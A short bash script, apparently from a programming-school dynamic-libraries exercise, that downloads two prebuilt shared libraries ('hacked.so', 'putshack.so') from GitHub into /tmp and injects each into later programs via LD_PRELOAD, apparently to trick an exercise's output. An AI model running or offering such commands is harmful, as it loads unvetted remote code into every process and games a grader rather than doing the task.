i#!/bin/bash
wget -P /tmp https://github.com/Jasemonu/alx-low_level_programming/raw/main/0x18-dynamic_libraries/hacked.so
export LD_PRELOAD=/tmp/hacked.so
wget -P /tmp https://github.com/sidneyriffic/holbertonschool-low_level_programming/raw/master/0x17-dynamic_libraries/putshack.so
export LD_PRELOAD=/tmp/putshack.so
